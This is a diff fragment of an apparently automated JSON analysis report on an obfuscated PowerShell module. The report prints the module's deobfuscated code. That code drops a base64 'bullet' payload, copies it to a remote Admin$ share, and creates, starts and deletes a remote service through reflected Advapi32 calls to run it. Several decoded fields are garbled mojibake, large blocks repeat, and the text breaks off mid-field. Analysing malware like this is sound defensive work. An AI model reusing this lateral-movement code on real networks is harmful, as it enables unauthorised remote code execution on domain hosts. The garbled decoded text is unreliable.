+        "dekodiert": "爣来潩⁮敨灬牥映湵瑣潩獮਍畦据楴湯传瑵䐭扥杵嬨瑓楲杮⑝桴䵥杳 ൻ †琠祲笠਍††††晩⠠圤瑩䑨扥杵 ൻ †††††椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨潌䙧汩⥥ ⁻嬢䕄啂嵇∠⬠␠桴䵥杳簠传瑵䐭晥畡瑬素਍††††††汥敳笠∠䑛䉅䝕⁝•‫琤敨獍⁧⁼摁ⵤ潃瑮湥⁴䰤杯楆敬素਍†††素਍††⁽慣捴⁨絻਍ൽ昊湵瑣潩⁮敇⵴楂獯敓楲污⤨笠਍††猤⁮‽䈢佉⁓乕之坏≎਍††弤湳㴠∠ഢ †琠祲笠਍††††洤敓牡档牥㴠䜠瑥圭業扏敪瑣ⴠ畑牥⁹匢䱅䍅⁔敓楲污畎扭牥䘠佒⁍楗㍮弲䥂协•攭⁡楓敬瑮祬潃瑮湩敵਍††††晩⠠洤敓牡档牥 ൻ †††††映牯慥档⠠漤椠⁮洤敓牡档牥 ൻ †††††††椠⁦␨⹯牐灯牥楴獥丮浡⁥攭ⁱ匢牥慩乬浵敢≲ ൻ †††††††††␠獟⁮‽漤倮潲数瑲敩⹳慖畬൥ †††††††素਍††††††ൽ †††素਍††ൽ †挠瑡档笠ൽ †椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨獟⥮ⴠ煥␠慦獬⥥笠␠湳㴠␠獟⁮ൽ †爠瑥牵⁮␢湳㬢਍ൽ昊湵瑣潩⁮潃癮牥⵴潔慂敳㐶嬨瑳楲杮⁝琤敨潓牵散 ൻ †爠瑥牵⁮䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥␨桴卥畯捲⥥ഩ紊਍畦据楴湯䌠湯敶瑲䘭潲䉭獡㙥⠴獛牴湩嵧␠桴卥畯捲⥥笠਍††敲畴湲嬠敔瑸䔮据摯湩嵧㨺呕㡆䜮瑥瑓楲杮嬨潃癮牥嵴㨺牆浯慂敳㐶瑓楲杮␨桴卥畯捲⥥ഩ紊਍਍畦据楴湯䌠敨正匭捥湯䍤灯⡹獛牴湩嵧␠湵煩敵摉 ൻ †␠敳潣摮潃祰㴠␠慦獬൥ †琠祲笠਍††††渤汵⁬‽呛牨慥楤杮匮浥灡潨敲㩝伺数䕮楸瑳湩⡧甤楮畱䥥⥤਍††††猤捥湯䍤灯⁹‽琤畲൥ †素挠瑡档笠਍††††猤牣灩㩴敓慭桰牯⁥‽敎⵷扏敪瑣吠牨慥楤杮匮浥灡潨敲〨‬ⰱ␠湵煩敵摉ഩ †素਍††敲畴湲␠敳潣摮潃祰਍ൽ⌊湥牤来潩൮ഊ⌊敲楧湯䌠湯潳敬䔠捸慨杮൥䘊湵瑣潩⁮敓摮吭䍯湯潳敬嬨瑓楲杮⁝琤敨湁睳牥 ൻ †椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨桴䅥獮敷⥲ ⁻敲畴湲素਍਍††弤捲㴠∠ഢ †琠祲笠਍††††弤捷㴠丠睥伭橢捥⁴祓瑳浥丮瑥圮扥汃敩瑮਍††††弤捷儮敵祲瑓楲杮䄮摤∨摩Ⱒ␠捳楲瑰洺䥹⥄਍††††弤捷䠮慥敤獲䄮摤∨潃瑮湥⵴祴数Ⱒ∠整瑸栯浴≬ഩ †††␠睟⹣效摡牥⹳摁⡤䄢捣灥≴‬琢硥⽴瑨汭⤢਍††††弤捲㴠␠睟⹣灕潬摡瑓楲杮␨牵䍬湯潳敬‬琤敨湁睳牥ഩഊ †††传瑵䐭扥杵∠敒楣癥摥映潲⁭潣獮汯㩥湠␧␨牟⥣∧਍††††敲畴湲⠠弤捲‬∢ഩ †素਍††慣捴⁨ൻ †††␠敟牲㴠␠⹟潔瑓楲杮⤨਍††††畏⵴敄畢⁧䌢湯潳敬攠捸慨杮⁥牥潲㩲湠⠤弤牥⥲湠呈偔䔠牲牯›⠤弤捲∩਍††††敲畴湲⠠∢‬弤牥⥲਍††ൽ紊਍攣摮敲楧湯਍਍爣来潩⁮湉瑩慩楬慺楴湯਍畦据楴湯删浥癯ⵥ祍敳晬笠਍††晩⠠判湵潐瑲扡敬 ⁻敲畴湲素਍††瀤潲䙧汩⁥‽猤牣灩㩴祭湉潶慣楴湯䴮䍹浯慭摮倮瑡൨ †椠⁦⠨敔瑳倭瑡⁨瀤潲䙧汩⥥ⴠ煥␠牴敵 ൻऊ††敒潭敶䤭整⁭瀤潲䙧汩⁥䘭牯散ⴠ牅潲䅲瑣潩⁮楓敬瑮祬潃瑮湩敵਍††ൽ紊਍਍畦据楴湯䤠楮⵴祍敳晬笠਍††弤獯㴠䜠瑥圭業扏敪瑣圠湩㈳佟数慲楴杮祓瑳浥ⴠ慥匠汩湥汴䍹湯楴畮൥ †椠⁦␨潟⥳笠਍††††洤佹噓牥楳湯㴠␠潟⹳慃瑰潩⁮‫••‫弤獯嘮牥楳湯਍††⁽汥敳笠਍††††洤佹噓牥楳湯㴠✠协唠歮潮湷搠敵琠⁯䵗⁉牥潲❲਍††ൽ †␠祭獕牥慎敭㴠嬠敓畣楲祴倮楲据灩污圮湩潤獷摉湥楴祴㩝䜺瑥畃牲湥⡴⸩慎敭਍††洤䡹獯乴浡⁥‽弤獯䌮乓浡൥ഊ †␠獟⁮‽敇⵴楂獯敓楲污਍††弤摩㴠∠⠤洤䡹獯乴浡⥥⑟␨祭獕牥慎敭弩⠤弤湳弩⠤䜤潲灵䑉∩਍††弤摩㴠嬠敒敧嵸㨺敒汰捡⡥弤摩‬嬢慞稭ⵁず㤭≝‬∢ഩ †␠獩敓潣摮潃祰㴠䌠敨正匭捥湯䍤灯⁹弤摩਍††猤牣灩㩴祭䑉㴠∠弤摩␭␨捳楲瑰洺噹牥∩਍਍††洤䑹浯楡⁮‽䠢獯⁴獩渠瑯愠洠浥敢⁲景搠浯楡≮਍††弤獣㴠䜠瑥圭業扏敪"
+      }
+    ],
+    "base64_bloecke_gesamt": 2,
+    "beobachtete_cmdlets": [
+      "Add-Content",
+      "Clear-Bullet",
+      "Copy-Item",
+      "Get-CimInstance",
+      "Get-DelegateType",
+      "Get-Item",
+      "Get-PlatformInfo",
+      "Get-ProcAddress",
+      "Get-Random",
+      "Get-RandomString",
+      "Get-WmiObject",
+      "Invoke-PsExec",
+      "Invoke-PsExecCmd",
+      "Join-Path",
+      "New-Object",
+      "Out-Debug",
+      "Out-Default",
+      "Out-Info",
+      "Remove-Item",
+      "Save-Bullet",
+      "Select-Object",
+      "Start-Module",
+      "Start-Sleep",
+      "Test-Path",
+      "Where-Object",
+      "Write-Output"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 1,
+      "noprofile": 1,
+      "reflection_assembly": 4
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:COMPUTERNAME",
+        "$env:PUBLIC",
+        "%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+        "%SYSTEMROOT%\\\\system32\\\\cmd.exe"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "mscorlib*",
+      "\r\n  if ($script:moduleDebug) { $_debugMode = ",
+      " }\r\n  return `\r\n      \"$ModVer. Run as ",
+      ". $_debugMode`n\" +\r\n      \"$osName / $osVersion / Powershell v${psVersion} / .Net ${dnetVersion}`n\"\r\n}\r\n\r\nfunction Save-Bullet([String] $SavePath) {\r\n  $bulletB64 = ",
+      "\r\n  $bulletText = [Text.Encoding]::UTF8.GetString([convert]::FromBase64String($bulletB64))\r\n\r\n  if ((Test-Path -path $SavePath) -eq $false) {\r\n      throw \"Can not save bullet. Directory ",
+      " does not exists\"\r\n  }\r\n  $bulletFile = [System.IO.Path]::GetRandomFileName() + ",
+      "\r\n  $bulletFile = Join-Path $SavePath $bulletFile\r\n  [Io.File]::WriteAllText($bulletFile, $bulletText)\r\n  return $bulletFile\r\n}\r\n\r\nfunction Clear-Bullet([String] $BulletFile) {\r\n  try {\r\n    Remove-Item $BulletFile -Force -ea SilentlyContinue\r\n  } catch {}\r\n}\r\n#endregion\r\n\r\nfunction Invoke-PsExec {\r\n  [CmdletBinding()]\r\n  param(\r\n    [string] $ComputerName,\r\n    [string] $BulletFile,\r\n    [string] $ServiceName,\r\n    [switch] $NoCleanup\r\n  )\r\n}\r\n\r\n  # ??  $ErrorActionPreference = \"Stop\"\r\n\r\n  function Local:Get-RandomString ([int]$Length = 12) {\r\n    $set = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\".ToCharArray()\r\n    $result = \"\"\r\n    for ($x = 0; $x -lt $Length; $x++) {\r\n      $result += $set | Get-Random\r\n    }\r\n    $result\r\n  }\r\n\r\n  function Local:Get-DelegateType {\r\n    Param (\r\n        [OutputType([Type])]\r\n        [Parameter( Position = 0)] [Type[]] $Parameters = (New-Object Type[](0)),\r\n        [Parameter( Position = 1 )] [Type] $ReturnType = [Void]\r\n    )\r\n\r\n    $Domain = [AppDomain]::CurrentDomain\r\n    $DynAssembly = New-Object System.Reflection.AssemblyName(",
+      ")\r\n    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\r\n    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(",
+      ", $false)\r\n    $TypeBuilder = $ModuleBuilder.DefineType(",
+      "Class, Public, Sealed, AnsiClass, AutoClass",
+      "RTSpecialName, HideBySig, Public",
+      "Runtime, Managed",
+      "Invoke",
+      "Public, HideBySig, NewSlot, Virtual",
+      ")[-1].Equals(",
+      ") }\r\n    $UnsafeNativeMethods = $SystemAssembly.GetType(",
+      ")\r\n    # Get a reference to the GetModuleHandle and GetProcAddress methods\r\n    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(",
+      ")\r\n    #$GetProcAddress = $UnsafeNativeMethods.GetMethod(",
+      ")\r\n    $GetProcAddress = $UnsafeNativeMethods.GetMethod(",
+      ", [reflection.bindingflags] \"Public,Static\", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);\r\n    # Get a handle to the module specified\r\n    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\r\n    $tmpPtr = New-Object IntPtr\r\n    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)\r\n      \r\n    # Return the address of the function\r\n    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))\r\n  }\r\n\r\n  function Local:Invoke-PsExecCmd {\r\n    param (\r\n      [string] $ComputerName,\r\n      [string] $RemoteBulletFile,\r\n      [string] $ServiceName,\r\n      [switch] $NoCleanup\r\n    )\r\n    $remoteCmd = \r\n      ",
+      " +\r\n      ",
+      " +\r\n      $RemoteBulletFile\r\n    \r\n    #region Declare/setup all the needed API function\r\n    $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle\r\n    $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])\r\n    $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    \r\n\r\n    $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA\r\n    $OpenSCManagerADelegate = Get-DelegateType @( [string], [string], [Int]) ([IntPtr])\r\n    $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)\r\n    \r\n    $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA\r\n    $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([Int])\r\n    $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)\r\n\r\n    $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA\r\n    $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [string], [string], [Int], [Int], [Int], [Int], [string], [string], [Int], [Int], [Int], [Int]) ([IntPtr])\r\n    $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)\r\n\r\n    $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA\r\n    $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([Int])\r\n    $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)\r\n\r\n    $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService\r\n    $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([Int])\r\n    $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)\r\n\r\n    $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError\r\n    $GetLastErrorDelegate = Get-DelegateType @() ([Int])\r\n    $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)\r\n    #endregion\r\n\r\n    #region Service manipulation\r\n    Out-Info ",
+      "\r\n    $ManagerHandle = $OpenSCManagerA.Invoke(\"\\\\$ComputerName\", \"ServicesActive\", 0xF003F)\r\n    if (-not $ManagerHandle) {\r\n      $lastErr = $GetLastError.Invoke()\r\n      Out-Info \"[!] #1. OpenSCManager. Operation failed, LastError: $$lastErr\"\r\n      throw \"GetLastError returned $lastErr\"\r\n    }\r\n\r\n    Out-Info \"[+] #2. CreateServiceA. Creating new service: ",
+      "\"\r\n    $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, `\r\n      $remoteCmd, $null, $null, $null, $null, $null)\r\n    if (-not $ServiceHandle) {\r\n      $lastErr = $GetLastError.Invoke()\r\n      Out-Info \"[!] #2. CreateService failed, LastError: $lastErr\"\r\n      throw \"GetLastError returned $lastErr\"\r\n    } \r\n\r\n    Out-Info \"[+] #3. StartService. Starting the service\"\r\n    $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)\r\n    Start-Sleep -s 3  # lets breathe for a second\r\n    $lastErr = $GetLastError.Invoke()\r\n    if ($val -ne 0){\r\n      Out-Debug \"[*] #3. StartService. Service successfully started\"\r\n    }\r\n    else{\r\n      if ($lastErr -eq 0){\r\n        Out-Debug \"[*] #3. StartService. Command returned ",
+      ". Looks like everything is Ok\"\r\n      } elseif ($lastErr -eq 1053){\r\n        Out-Debug \"[*] #3. StartService. Command didn",
+      "s Ok, normal behaviour\"\r\n      } else{\r\n        Out-Info \"[!] #3. StartService. StartService failed, LastError: $lastErr\"\r\n      }\r\n    }\r\n\r\n    Out-Info \"[+] #4. DeleteService. Deleting the service ",
+      " after small pause\"\r\n    Start-Sleep -s 15  # lets breathe for a bit\r\n    $val = $DeleteService.invoke($ServiceHandle)\r\n    if ($val -eq 0){\r\n      $lastErr = $GetLastError.Invoke()\r\n      Out-Info \"[!] #4. DeleteService. DeleteService failed, LastError: $lastErr\"\r\n    } else{\r\n      Out-Debug \"[*] #4. DeleteService. Service successfully deleted\"\r\n    }\r\n    \r\n    Out-Info \"[+] #5. CloseServiceHandle. Closing the Service handle\"\r\n    $val = $CloseServiceHandle.Invoke($ServiceHandle)\r\n\r\n    Out-Info \"[+] #6. CloseServiceHandle. Closing the SC Manager handle\"\r\n    $null = $CloseServiceHandle.Invoke($ManagerHandle)\r\n  #endregion\r\n  #Invoke-PsExecCmd\r\n}  \r\n\r\n\r\n  #region Invoke-PsExec code\r\n  try {\r\n    $remoteBulletFile = [System.IO.Path]::GetRandomFileName() + ",
+      "\r\n    $RemoteUploadPath = \"\\\\$ComputerName\\Admin$\\$remoteBulletFile\"\r\n    Out-Info \"[*] Copying bullet file $BulletFile to ",
+      "\"\r\n    Copy-Item -Force -Path $BulletFile -Destination $RemoteUploadPath\r\n  } catch {\r\n    throw \"[!] Can not upload bullet file $BulletFile to remote share $RemoteUploadPath`n$($error[0])\"\r\n  }\r\n  \r\n  Invoke-PsExecCmd -ComputerName $ComputerName -RemoteBulletFile $RemoteUploadPath -ServiceName $ServiceName\r\n\r\n  try {\r\n    Out-Info \"[*] Removing the remote bullet file ",
+      "\"\r\n    Remove-Item -Path $RemoteUploadPath -Force\r\n  } catch {}\r\n  #endregion\r\n\r\n\r\nfunction Start-Module {\r\n  Param (\r\n    [String] $TargetHost = ",
+      ",\r\n    [string] $ServiceName = \"VmHealthCheck\",\r\n    [String] $LogFile = ",
+      ",\r\n    [Switch] $Debug\r\n  )\r\n\r\n  $script:moduleLogFile = $LogFile\r\n  $script:moduleDebug = $Debug\r\n  Out-Info (Get-PlatformInfo)\r\n  Out-Debug \"[+] Start module with params: TargetHost: ",
+      "  ServiceName: ",
+      "\"\r\n\r\n  try {\r\n    if (-not ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain)) {\r\n        throw \"[!] Current host $($env:COMPUTERNAME) is not a member of domain and can",
+      "\r\n    }\r\n    if ([string]::IsNullOrEmpty($TargetHost)) {\r\n      throw ",
+      "\r\n    }\r\n  \r\n    $SavePath = $env:PUBLIC\r\n    $LocalBulletFile = Save-Bullet $SavePath\r\n    $cbBullet = (Get-Item $LocalBulletFile).length\r\n    Out-Debug ",
+      "$LocalBulletFile",
+      "\r\n    $ServiceName = $ServiceName + (Get-Random -Maximum 10000).ToString()\r\n    Invoke-PsExec -ComputerName $TargetHost -BulletFile ",
+      " -ServiceName $ServiceName\r\n  } \r\n  catch {\r\n    Out-Info ",
+      "\r\n    Out-Info $error[0].Message\r\n    Out-Debug $error[0].InvocationInfo.PositionMessage \r\n  }\r\n  finally {\r\n    Clear-Bullet $LocalBulletFile\r\n  }\r\n}\r\n\r\n# -- module startup ----------------------------------------\r\n$ModVer = ",
+      "\r\n$script:moduleLogFile = ''\r\n$script:moduleDebug = $false\r\n$global:ProgressPreference = ",
+      "\r\n$script:SessionUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name\r\n\r\nStart-Module -TargetHost ",
+      "   \r\nOut-Info "
+    ],
+    "string_anzahl_gesamt": 44,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 15124,
+        "dekodiert": "爣来潩⁮敨灬牥映湵瑣潩獮਍畦据楴湯传瑵䐭扥杵嬨瑓楲杮⑝桴䵥杳 ൻ †琠祲笠਍††††晩⠠圤瑩䑨扥杵 ൻ †††††椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨潌䙧汩⥥ ⁻嬢䕄啂嵇∠⬠␠桴䵥杳簠传瑵䐭晥畡瑬素਍††††††汥敳笠∠䑛䉅䝕⁝•‫琤敨獍⁧⁼摁ⵤ潃瑮湥⁴䰤杯楆敬素਍†††素਍††⁽慣捴⁨絻਍ൽ昊湵瑣潩⁮敇⵴楂獯敓楲污⤨笠਍††猤⁮‽䈢佉⁓乕之坏≎਍††弤湳㴠∠ഢ †琠祲笠਍††††洤敓牡档牥㴠䜠瑥圭業扏敪瑣ⴠ畑牥⁹匢䱅䍅⁔敓楲污畎扭牥䘠佒⁍楗㍮弲䥂协•攭⁡楓敬瑮祬潃瑮湩敵਍††††晩⠠洤敓牡档牥 ൻ †††††映牯慥档⠠漤椠⁮洤敓牡档牥 ൻ †††††††椠⁦␨⹯牐灯牥楴獥丮浡⁥攭ⁱ匢牥慩乬浵敢≲ ൻ †††††††††␠獟⁮‽漤倮潲数瑲敩⹳慖畬൥ †††††††素਍††††††ൽ †††素਍††ൽ †挠瑡档笠ൽ †椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨獟⥮ⴠ煥␠慦獬⥥笠␠湳㴠␠獟⁮ൽ †爠瑥牵⁮␢湳㬢਍ൽ昊湵瑣潩⁮潃癮牥⵴潔慂敳㐶嬨瑳楲杮⁝琤敨潓牵散 ൻ †爠瑥牵⁮䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥␨桴卥畯捲⥥ഩ紊਍畦据楴湯䌠湯敶瑲䘭潲䉭獡㙥⠴獛牴湩嵧␠桴卥畯捲⥥笠਍††敲畴湲嬠敔瑸䔮据摯湩嵧㨺呕㡆䜮瑥瑓楲杮嬨潃癮牥嵴㨺牆浯慂敳㐶瑓楲杮␨桴卥畯捲⥥ഩ紊਍਍畦据楴湯䌠敨正匭捥湯䍤灯⡹獛牴湩嵧␠湵煩敵摉 ൻ †␠敳潣摮潃祰㴠␠慦獬൥ †琠祲笠਍††††渤汵⁬‽呛牨慥楤杮匮浥灡潨敲㩝伺数䕮楸瑳湩⡧甤楮畱䥥⥤਍††††猤捥湯䍤灯⁹‽琤畲൥ †素挠瑡档笠਍††††猤牣灩㩴敓慭桰牯⁥‽敎⵷扏敪瑣吠牨慥楤杮匮浥灡潨敲〨‬ⰱ␠湵煩敵摉ഩ †素਍††敲畴湲␠敳潣摮潃祰਍ൽ⌊湥牤来潩൮ഊ⌊敲楧湯䌠湯潳敬䔠捸慨杮൥䘊湵瑣潩⁮敓摮吭䍯湯潳敬嬨瑓楲杮⁝琤敨湁睳牥 ൻ †椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨桴䅥獮敷⥲ ⁻敲畴湲素਍਍††弤捲㴠∠ഢ †琠祲笠਍††††弤捷㴠丠睥伭橢捥⁴祓瑳浥丮瑥圮扥汃敩瑮਍††††弤捷儮敵祲瑓楲杮䄮摤∨摩Ⱒ␠捳楲瑰洺䥹⥄਍††††弤捷䠮慥敤獲䄮摤∨潃瑮湥⵴祴数Ⱒ∠整瑸栯浴≬ഩ †††␠睟⹣效摡牥⹳摁⡤䄢捣灥≴‬琢硥⽴瑨汭⤢਍††††弤捲㴠␠睟⹣灕潬摡瑓楲杮␨牵䍬湯潳敬‬琤敨湁睳牥ഩഊ †††传瑵䐭扥杵∠敒楣癥摥映潲⁭潣獮汯㩥湠␧␨牟⥣∧਍††††敲畴湲⠠弤捲‬∢ഩ †素਍††慣捴⁨ൻ †††␠敟牲㴠␠⹟潔瑓楲杮⤨਍††††畏⵴敄畢⁧䌢湯潳敬攠捸慨杮⁥牥潲㩲湠⠤弤牥⥲湠呈偔䔠牲牯›⠤弤捲∩਍††††敲畴湲⠠∢‬弤牥⥲਍††ൽ紊਍攣摮敲楧湯਍਍爣来潩⁮湉瑩慩楬慺楴湯਍畦据楴湯删浥癯ⵥ祍敳晬笠਍††晩⠠判湵潐瑲扡敬 ⁻敲畴湲素਍††瀤潲䙧汩⁥‽猤牣灩㩴祭湉潶慣楴湯䴮䍹浯慭摮倮瑡൨ †椠⁦⠨敔瑳倭瑡⁨瀤潲䙧汩⥥ⴠ煥␠牴敵 ൻऊ††敒潭敶䤭整⁭瀤潲䙧汩⁥䘭牯散ⴠ牅潲䅲瑣潩⁮楓敬瑮祬潃瑮湩敵਍††ൽ紊਍਍畦据楴湯䤠楮⵴祍敳晬笠਍††弤獯㴠䜠瑥圭業扏敪瑣圠湩㈳佟数慲楴杮祓瑳浥ⴠ慥匠汩湥汴䍹湯楴畮൥ †椠⁦␨潟⥳笠਍††††洤佹噓牥楳湯㴠␠潟⹳慃瑰潩⁮‫••‫弤獯嘮牥楳湯਍††⁽汥敳笠਍††††洤佹噓牥楳湯㴠✠协唠歮潮湷搠敵琠⁯䵗⁉牥潲❲਍††ൽ †␠祭獕牥慎敭㴠嬠敓畣楲祴倮楲据灩污圮湩潤獷摉湥楴祴㩝䜺瑥畃牲湥⡴⸩慎敭਍††洤䡹獯乴浡⁥‽弤獯䌮乓浡൥ഊ †␠獟⁮‽敇⵴楂獯敓楲污਍††弤摩㴠∠⠤洤䡹獯乴浡⥥⑟␨祭獕牥慎敭弩⠤弤湳弩⠤䜤潲灵䑉∩਍††弤摩㴠嬠敒敧嵸㨺敒汰捡⡥弤摩‬嬢慞稭ⵁず㤭≝‬∢ഩ †␠獩敓潣摮潃祰㴠䌠敨正匭捥湯䍤灯⁹弤摩਍††猤牣灩㩴祭䑉㴠∠弤摩␭␨捳楲瑰洺噹牥∩਍਍††洤䑹浯楡⁮‽䠢獯⁴獩渠瑯愠洠浥敢⁲景搠浯楡≮਍††弤獣㴠䜠瑥圭業扏敪"
+      }
+    ],
+    "base64_bloecke_gesamt": 2,
+    "beobachtete_cmdlets": [
+      "Add-Content",
+      "Clear-Bullet",
+      "Copy-Item",
+      "Get-CimInstance",
+      "Get-DelegateType",
+      "Get-Item",
+      "Get-PlatformInfo",
+      "Get-ProcAddress",
+      "Get-Random",
+      "Get-RandomString",
+      "Get-WmiObject",
+      "Invoke-PsExec",
+      "Invoke-PsExecCmd",
+      "Join-Path",
+      "New-Object",
+      "Out-Debug",
+      "Out-Default",
+      "Out-Info",
+      "Remove-Item",
+      "Save-Bullet",
+      "Select-Object",
+      "Start-Module",
+      "Start-Sleep",
+      "Test-Path",
+      "Where-Object",
+      "Write-Output"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 1,
+      "noprofile": 1,
+      "reflection_assembly": 4
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:COMPUTERNAME",
+        "$env:PUBLIC",
+        "%SYSTEMROOT%\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+        "%SYSTEMROOT%\\\\system32\\\\cmd.exe"
+      ]
+    },
+    "deobfuskiert_auszug": "﻿#region Helpers\r\nfunction Out-Info([String] $theMsg) {\r\n  try {\r\n      if ($script:moduleLogFile) { Add-Content -path $script:moduleLogFile -value $theMsg }\r\n      #elseif ($script:moduleDebug) { $theMsg | Out-Default }\r\n      else { $theMsg }\r\n  } catch {}\r\n}\r\n\r\nfunction Out-Debug($theMsg) {\r\n  if ($script:moduleDebug) {\r\n    Out-Info $theMsg\r\n  }\r\n}\r\n\r\nfunction Get-PlatformInfo {\r\n  $osName = [environment]::osVersion.versionString\r\n  $osVersion = (Get-CimInstance Win32_OperatingSystem).Version\r\n  $psVersion = $psversiontable.PSVersion.ToString()\r\n  $dnetVersion = ([System.AppDomain]::CurrentDomain.GetAssemblies() |\r\n    where-object { $_.FullName -like 'mscorlib*' } | \r\n    Select-Object ImageRuntimeVersion).ImageRuntimeVersion\r\n  $_debugMode = ''\r\n  if ($script:moduleDebug) { $_debugMode = 'Debug ON' }\r\n  return \r\n      \"$ModVer. Run as '$script:SessionUser'. $_debugModen\" +\r\n      \"$osName / $osVersion / Powershell v${psVersion} / .Net ${dnetVersion}n\"\r\n}\r\n\r\nfunction Save-Bullet([String] $SavePath) {\r\n  $bulletB64 = 'I3JlZ2lvbiBoZWxwZXIgZnVuY3Rpb25zDQpmdW5jdGlvbiBPdXQtRGVidWcoW1N0cmluZ10kdGhlTXNnKSB7DQogICAgdHJ5IHsNCiAgICAgICAgaWYgKCRXaXRoRGVidWcpIHsNCiAgICAgICAgICAgIGlmIChbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkTG9nRmlsZSkpIHsgIltERUJVR10gIiArICR0aGVNc2cgfCBPdXQtRGVmYXVsdCB9DQogICAgICAgICAgICBlbHNlIHsgIltERUJVR10gIiArICR0aGVNc2cgfCBBZGQtQ29udGVudCAkTG9nRmlsZSB9DQogICAgICAgfQ0KICAgIH0gY2F0Y2gge30NCn0NCmZ1bmN0aW9uIEdldC1CaW9zU2VyaWFsKCkgew0KICAgICRzbiA9ICJCSU9TIFVOS05PV04iDQogICAgJF9zbiA9ICIiDQogICAgdHJ5IHsNCiAgICAgICAgJG1TZWFyY2hlciA9IEdldC1XbWlPYmplY3QgLVF1ZXJ5ICJTRUxFQ1QgU2VyaWFsTnVtYmVyIEZST00gV2luMzJfQklPUyIgLWVhIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgaWYgKCRtU2VhcmNoZXIpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRvIGluICRtU2VhcmNoZXIpIHsNCiAgICAgICAgICAgICAgICBpZiAoJG8uUHJvcGVydGllcy5OYW1lIC1lcSAiU2VyaWFsTnVtYmVyIikgew0KICAgICAgICAgICAgICAgICAgICAkX3NuID0gJG8uUHJvcGVydGllcy5WYWx1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7fQ0KICAgIG",
+    "dekodierte_befehle": [
